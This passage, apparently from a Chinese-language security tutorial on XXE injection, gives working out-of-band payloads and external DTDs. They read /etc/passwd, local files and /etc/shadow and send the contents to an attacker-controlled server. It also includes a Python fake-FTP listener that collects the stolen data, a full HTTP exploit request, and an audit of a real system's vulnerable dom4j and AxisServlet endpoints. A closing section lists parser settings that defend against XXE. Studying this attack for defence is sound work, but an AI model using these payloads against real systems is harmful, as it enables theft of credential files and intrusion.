+&lt;!ENTITY % param1 "file:///c:/1.txt"&gt;
+&lt;!ENTITY % param2 "&lt;!ENTITY % param222 SYSTEM'http://127.0.0.1/?%param1;'&gt;"&gt;
+%param2;
+]&gt;
+&lt;root&gt;</code></pre>
+<p>但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125145913-16ac4b82-0f51-1.png"/></p>
+<p>解决方案是：</p>
+<p>将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。</p>
+<p>如下：</p>
+<p>payload</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE ANY[</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
+<span class="cp">&lt;!ENTITY % remote SYSTEM "http://192.168.100.1/evil.xml"&gt;</span>
+%remote;
+%all;
+]&gt;
+</pre></div>
+<p>【evil.xml】</p>
+<pre><code>&lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://192.168.100.1/?file=%file;'&gt;"&gt;</code></pre>
+<p>nc -lvv port 监听即可获得请求回显内容</p>
+<h3 data-content="1" id="6628ba668bb7256429ac20a00354b484">6.2 XXE利用</h3>
+<p>示例无回显读取本地敏感文件（Blind OOB XXE）：</p>
+<p>此部分演示借用php中XXE进行说明</p>
+<p>xml.php</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+
+<span class="cp">libxml_disable_entity_loader (false);</span>
+<span class="cp">$xmlfile = file_get_contents('php://input');</span>
+<span class="cp">$dom = new DOMDocument();</span>
+<span class="cp">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span>
+<span class="cp">?&gt;</span>
+</pre></div>
+<p>test.dtd</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt"&gt;</span>
+<span class="cp">&lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://ip:9999?p=%file;'&gt;</span>"&gt;
+</pre></div>
+<p>payload:</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE convert [ </span>
+<span class="cp">&lt;!ENTITY % remote SYSTEM "http://ip/test.dtd"&gt;</span>
+%remote;%int;%send;
+]&gt;
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125150007-36ecfe3c-0f51-1.png"/></p>
+<p>结果如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125150033-469ad9a8-0f51-1.png"/></p>
+<p><strong>整个调用过程：</strong></p>
+<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>&amp;#37;</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<p><strong>新的利用</strong></p>
+<p>如图所示</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125150059-55f65940-0f51-1.png"/></p>
+<p><strong>注意：</strong></p>
+<p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7<br/>
+update 7 和 Oracle JDK 1.6 update 35<br/>
+2.libxml 是 PHP 的 xml 支持</p>
+<p><strong>netdoc协议</strong></p>
+<p>Java中在过滤了file|ftp|gopher|情况下使用netdoc 协议列目录：</p>
+<p>附上一张图</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125150158-78f1abfc-0f51-1.png"/></p>
+<p>另外对于带外XXE还可以通过burp 进行测试如（附上两张图）：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125150222-878e75d2-0f51-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125150258-9c9c03a4-0f51-1.png"/></p>
+<p>可参考<a href="https://paper.tuisec.win/detail/77e971804021874" target="_blank">这篇文章</a>,关于burp此插件还可在多个场景测试中用到比如XSS、SQL、SSRF等。关于此插件的利用可参考<a href="https://www.cnblogs.com/blacksunny/p/8005053.html" target="_blank">这篇博文</a>在这不进行过多介绍。</p>
+<p>​    <strong>最后，</strong>分享一下审计中遇到两个XXE的审计与利用思路过程。</p>
+<p>​    第一处出现在系统使用的org.dom4j.DocumentHelper调用的类函数下。</p>
+<p>在源码中搜索关键字DocumentHelper.parseText</p>
+<p>得到：</p>
+<div class="highlight"><pre><span></span><span class="err">\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="err">\</span><span class="o">***.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">303</span><span class="o">:</span>    <span class="n">document</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span>
+
+<span class="err">\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="err">\</span><span class="n">XmlParser</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">51</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xmlStr</span><span class="o">);</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="err">\</span><span class="o">***</span><span class="n">Task</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">350</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="err">\</span><span class="o">***</span><span class="n">Action</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">237</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">mapDataForOut</span><span class="o">);</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="err">\</span><span class="n">xxxAction</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">259</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">mapDataForOut</span><span class="o">);</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="err">\</span><span class="n">xxx</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">120</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">policyXml</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"_lnx"</span><span class="o">,</span> <span class="s">""</span><span class="o">));</span>
+<span class="n">Line</span> <span class="mi">125</span><span class="o">:</span>    <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">node</span><span class="o">.</span><span class="na">asXML</span><span class="o">());</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="n">tion</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">109</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xmlStr</span><span class="o">);</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">58</span><span class="o">:</span>    <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span> <span class="c1">// 将字符串转为XML</span>
+
+<span class="err">\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">92</span><span class="o">:</span>    <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span>
+<span class="n">Line</span> <span class="mi">97</span><span class="o">:</span>    <span class="n">oldDoc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">vaildXml</span><span class="o">);</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="n">ObjConverter</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">173</span><span class="o">:</span>     <span class="n">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">949</span><span class="o">:</span>     <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">infor</span><span class="o">.</span><span class="na">getContent</span><span class="o">());</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="n">Utility</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">1203</span><span class="o">:</span>     <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="n">xxxService</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">177</span><span class="o">:</span>     <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">requestHeader</span><span class="o">);</span>
+
+<span class="err">\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="err">\</span><span class="n">EventParser</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">83</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xmlStr</span><span class="o">);</span>
+<span class="n">Line</span> <span class="mi">185</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xmlStr</span><span class="o">);</span>
+<span class="n">Line</span> <span class="mi">229</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xmlStr</span><span class="o">);</span>
+<span class="n">Line</span> <span class="mi">306</span><span class="o">:</span>    <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">contentXml</span><span class="o">)).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"&lt;"</span><span class="o">,</span> <span class="s">"&amp;lt;"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"&gt;"</span><span class="o">,</span> <span class="s">"&amp;gt;"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"==amp;"</span><span class="o">,</span>  
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="err">\</span><span class="n">XMLMessageUtil</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">24</span><span class="o">:</span>    <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span>
+<span class="n">Line</span> <span class="mi">131</span><span class="o">:</span>    <span class="n">tempDoc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span>
+<span class="n">Line</span> <span class="mi">224</span><span class="o">:</span>    <span class="n">document</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="s">"&lt;a&gt;&lt;b&gt;&lt;/b&gt;&lt;/a&gt;"</span><span class="o">);</span>
+
+<span class="err">\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***</span><span class="err">\</span><span class="n">XmlParser</span><span class="o">.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">51</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xmlStr</span><span class="o">);</span>
+
+<span class="err">\\</span><span class="n">xxx</span><span class="err">\</span><span class="o">***.</span><span class="na">java</span> 
+<span class="n">Line</span> <span class="mi">244</span><span class="o">:</span>    <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">DocumentHelper</span><span class="o">.</span><span class="na">parseText</span><span class="o">(</span><span class="n">xmlStr</span><span class="o">);</span>
+</pre></div>
+<p>其中，<code>\xxx\***\XMLMessageUtil.java</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125151310-09c719ae-0f53-1.png"/></p>
+<p>代码中 使用org.dom4j.DocumentHelper.parseTest解析XML文件</p>
+<p>第二处，发现位置是在查看web.xml文件中AxisServlet的servlet-mapping配置，发现URL地址包含以下路径或后缀就可被攻击利用</p>
+<div class="highlight"><pre><span></span>***\WebRoot\WEB-INF\web.xml 
+xxx\***\WebRoot\WEB-INF\web.xml
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nt">&lt;servlet-mapping&gt;</span>
+<span class="nt">&lt;servlet-name&gt;</span>AxisServlet<span class="nt">&lt;/servlet-name&gt;</span>
+       <span class="nt">&lt;url-pattern&gt;</span>/servlet/AxisServlet<span class="nt">&lt;/url-pattern&gt;</span>
+   <span class="nt">&lt;/servlet-mapping&gt;</span>  
+   <span class="nt">&lt;servlet-mapping&gt;</span>
+       <span class="nt">&lt;servlet-name&gt;</span>AxisServlet<span class="nt">&lt;/servlet-name&gt;</span>
+       <span class="nt">&lt;url-pattern&gt;</span>*.jws<span class="nt">&lt;/url-pattern&gt;</span>
+   <span class="nt">&lt;/servlet-mapping&gt;</span>
+   <span class="nt">&lt;servlet-mapping&gt;</span>
+       <span class="nt">&lt;servlet-name&gt;</span>AxisServlet<span class="nt">&lt;/servlet-name&gt;</span>
+       <span class="nt">&lt;url-pattern&gt;</span>/services/*<span class="nt">&lt;/url-pattern&gt;</span>
+   <span class="nt">&lt;/servlet-mapping&gt;</span>
+</pre></div>
+<p>在通过访问以下URL即可访问到AxisServlet服务，可对其进行XXE漏洞攻击。</p>
+<p><code>https://ip/xxx/servlet/AxisServlet</code></p>
+<p><code>https://ip/***/servlet/AxisServlet</code></p>
+<p>POC:</p>
+<p>0x1:</p>
+<p>在复现时由于目标主机无法访问外网，所以需要在本地主机上搭建测试环境，具体的复现过程如下（嗯额这里感谢一下同事）：</p>
+<p>1）新建目录xxe_test，复制下面文件放入</p>
+<p>test.dtd</p>
+<pre><code>&lt;!ENTITY % param3 "&lt;!ENTITY % exfil SYSTEM 'ftp://ip/%data3;'&gt;"&gt;</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125150341-b67ce5a4-0f51-1.png"/></p>
+<p>2)在xxe_test目录下运行如下命令，监听8080端口（检查防火墙是否开放该端口）</p>
+<p>Python -m SimpleHTTPServer 8080</p>
+<p>3)运行以下脚本，启动ftp服务器（检查防火墙是否开放21端口）</p>
+<p>Python xxe-ftp.py</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125150528-f60442d0-0f51-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/env/python</span>
+<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">'0.0.0.0'</span><span class="p">,</span><span class="mi">21</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">'XXE-FTP listening '</span><span class="p">)</span>
+<span class="n">conn</span><span class="p">,</span><span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">'Connected by </span><span class="si">%s</span><span class="s1">'</span><span class="p">,</span><span class="n">addr</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="s1">'220 Staal XXE-FTP</span><span class="se">\r\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">stop</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">while</span> <span class="ow">not</span> <span class="n">stop</span><span class="p">:</span>
+    <span class="n">dp</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">dp</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"USER"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="s2">"331 password please - version check</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="s2">"230 more data please!</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">dp</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"RETR"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span> <span class="ow">or</span> <span class="n">dp</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"QUIT"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
+        <span class="n">stop</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="k">if</span> <span class="n">dp</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"CWD"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">dp</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'CWD '</span><span class="p">,</span><span class="s1">'/'</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'</span><span class="se">\r\n</span><span class="s1">'</span><span class="p">,</span><span class="s1">''</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s1">''</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">dp</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+<p>4)发送以下报文：</p>
+<pre><code>POST /xxx/*** HTTP/1.1
+Host: target_ip
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: application/json, text/javascript, */*
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+X-Requested-With: XMLHttpRequest
+Referer: https://target_ip/xxx/***.jsp
+ContentType: pplication/x-www-form-urlencoded
+Cookie: JSESSIONID=WwV5E_ZpZVWhnIKEaFuuphs1.localhost; ops.cookie.principal=xxxxx
+DNT: 1
+Connection: close
+Content-Type: text/xml
+Content-Length: 159
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE r [
+&lt;!ENTITY % data3 SYSTEM "file:///etc/shadow"&gt;
+&lt;!ENTITY % sp SYSTEM "http://Your_IP/test.dtd"&gt;
+%sp;
+%param3;
+%exfil;
+]&gt;</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125150555-067a43da-0f52-1.png"/></p>
+<p><strong>漏洞截图</strong>：</p>
+<p>0x1:</p>
+<p>成功获取到受害主机的/etc/shadow文件</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191125150630-1b222e88-0f52-1.png"/></p>
+<p>结束。</p>
+<p>​      另外，也可呀使用工具<a href="https://github.com/MichaelWayneLIU/XXEinjector.git" target="_blank">XXEinjector </a>完成带外攻击。 具体可<a href="https://michaelwayneliu.github.io/2018/08/28/XXE%E6%94%BB%E5%87%BB%E9%82%A3%E4%BA%9B%E4%BA%8B/" target="_blank">参考</a></p>
+<h2 data-content="1" id="a36bbc3acee3f0cdf546b730c836c758">7.xxe防御</h2>
+<p>使用语言中推荐的禁用外部实体的方法</p>
+<p><strong>PHP：</strong></p>
+<pre><code>libxml_disable_entity_loader(true);</code></pre>
+<p><strong>JAVA:</strong></p>
+<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);
+
+.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
+
+.setFeature("http://xml.org/sax/features/external-general-entities",false)
+
+.setFeature("http://xml.org/sax/features/external-parameter-entities",false);</code></pre>
+<p><strong>Python：</strong></p>
+<pre><code>from lxml import etree
+xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre>
+<p>参考<br/>
+<a href="https://paper.tuisec.win/detail/77e971804021874" target="_blank">https://paper.tuisec.win/detail/77e971804021874</a><br/>
+<a href="https://www.cnblogs.com/blacksunny/p/8005053.html" target="_blank">https://www.cnblogs.com/blacksunny/p/8005053.html</a><br/>
+<a href="https://michaelwayneliu.github.io/2018/08/28/XXE%E6%94%BB%E5%87%BB%E9%82%A3%E4%BA%9B%E4%BA%8B/" target="_blank">https://michaelwayneliu.github.io/2018/08/28/XXE%E6%94%BB%E5%87%BB%E9%82%A3%E4%BA%9B%E4%BA%8B/</a></p>
+</div>
+</div>
